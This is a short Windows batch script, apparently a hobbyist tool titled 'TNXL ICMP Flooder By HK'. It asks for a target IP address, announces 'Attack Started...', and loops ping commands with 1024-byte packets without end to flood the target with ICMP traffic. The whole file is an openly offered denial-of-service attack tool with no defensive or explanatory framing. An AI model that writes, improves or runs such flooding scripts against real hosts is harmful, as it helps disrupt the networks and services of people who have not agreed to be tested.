@echo OFF
color 04
title: TNXL ICMP Flooder By HK
:prompt
set /P ip=IP:
if /I "%ip%"=="" goto :error
echo Attack Started...
echo CTRL+C to stop
:loop
ping %ip% -l 1024 -w 1 -n 1
goto :loop

:error
echo No IP Address Specified!
pause 
set /P choice=Do you want to flood again(y/n)?
if /I "%choice%"=="y" goto :prompt
if /I "%choice%"=="n" exit






